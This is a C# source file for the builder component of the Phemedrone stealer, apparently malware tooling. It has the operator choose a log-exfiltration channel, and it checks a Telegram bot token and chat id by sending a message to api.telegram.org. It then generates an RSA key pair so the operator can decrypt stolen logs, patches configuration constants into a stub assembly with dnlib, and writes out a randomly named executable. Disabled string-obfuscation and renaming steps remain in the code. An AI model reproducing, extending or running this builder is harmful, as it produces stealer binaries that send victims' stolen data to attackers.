using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using dnlib.DotNet;
using dnlib.DotNet.Writer;
using Phemedrone.Tools.Interface;
using Phemedrone.Tools.Interface.Settings;

namespace Phemedrone.Tools.Builder
{
    public class Phase
    {
        public static void Begin()
        {
            var values = new Dictionary<string, object>
            {
                {
                    "type",
                    new OptionSelection<string>(new OptionSelectionSettings<string> 
                    {
                        Title = "Select log sending method",
                        Description = "Use \"Telegram\" if you are beginner",
                        Options = Arguments.ServiceArguments.Select(s => s.ClassName).ToList()
                    }).Draw()
                }
            };

            var defaultValues = new Dictionary<string, object>();
            
            var service = Arguments.ServiceArguments.First(s => s.ClassName == (string)values["type"]);
            foreach (var val in service.Arguments)
            {
                values.Add(val.Key, val.Value());
            }
            
            var randomName = RandomValues.RandomString(3);
            defaultValues.Add("BuildID", randomName);

            var keyPair = RsaClass.GenerateKeyPair();
            if ((string)values["type"] == "Telegram")
            {
                new Popup(new DefaultSettings
                {
                    Title = "Connection check",
                    Description = "After pressing Enter, a message will be sent you via Telegram bot you've specified before. Make sure you've sent /start message to your bot."
                }).Draw();

                try
                {
                    new WebClient().DownloadData(string.Format(
                        "https://api.telegram.org/bot{0}/sendMessage?chat_id={1}&text={2}&parse_mode={3}",
                        values["token"],
                        values["chat_id"],
                        "<b>This is a test message from Phemedrone Builder ✅</b>\r\n\r\n<i>If you see this message, then you've configured credentials correctly. Now you may get back to builder, confirm successful configuration and proceed to next instructions.</i>",
                        "HTML"));
                }
                catch
                {
                    new Popup(new DefaultSettings
                    {
                        Title = "Connection error",
                        Description = "There was an error during making the request. It might be caused by invalid bot token or chat id. Check all fields and retry."
                    }).Draw();
                    Environment.Exit(-1);
                }

                var isSucceed = new BooleanSelection(new BooleanSelectionSettings
                {
                    Title = "Is configuration successful",
                    Description = "If you've seen message from Telegram bot you've configured before, then select [yes]. Otherwise something is wrong and you have to enter Telegram credentials again. Make sure you've sent /start message to bot and try again.",
                    DefaultValue = false
                }).Draw();
                
                if (!isSucceed) Environment.Exit(-1);
                
                values.Add("key_pair", keyPair.Item2);
            }

            foreach (var defaultArg in Arguments.DefaultArguments)
            {
                defaultValues.Add(defaultArg.Key, defaultArg.Value());
            }

            var progress = new ProgressWindow(new ProgressWindowSettings
            {
                Title = "Building project",
                Description = "This might take a while",
                Progress = 0,
                Stage = "Updating variables"
            });
            progress.Draw();

            var module = ModuleDefMD.Load("stub/stub");

            progress.Update("Updating variables", 0);
            ConstantChanger.Run(module, progress, values, defaultValues);

            //progress.Update("Obfuscating strings", 0);
            //StringObfuscation.Run(module);
            
            //progress.Update("Renaming classes", 0);
            //Renamer.Run(module);

            progress.Update("Done", 1);

            if (!Directory.Exists("build")) Directory.CreateDirectory("build");
            
            var options = new ModuleWriterOptions(module);
            options.MetadataOptions.Flags |= MetadataFlags.KeepOldMaxStack;
            options.Logger = DummyLogger.NoThrowInstance;
            module.Write("build/" + randomName + ".exe", options);
            
            if ((string)values["type"] == Arguments.ServiceArguments.First().ClassName)
            {
                File.WriteAllText("build/" + randomName + ".xml", keyPair.Item1);
                new Popup(new DefaultSettings
                {
                    Title = "Private key notification",
                    Description = "IMPORTANT! As you selected Telegram as sending service, you need to save a private key, used for decrypting your logs. IF YOU LOSE THIS KEY, YOU WON'T BE ABLE TO GET LOG CONTENT ANYMORE. A private key file in save in build/"+randomName+".xml."
                }).Draw();
            }
            
            new Popup(new DefaultSettings
            {
                Title = "Build success",
                Description = "Your Phemedrone build was successfully built and saved to build/"+randomName+".exe"
            }).Draw();
        }
    }
}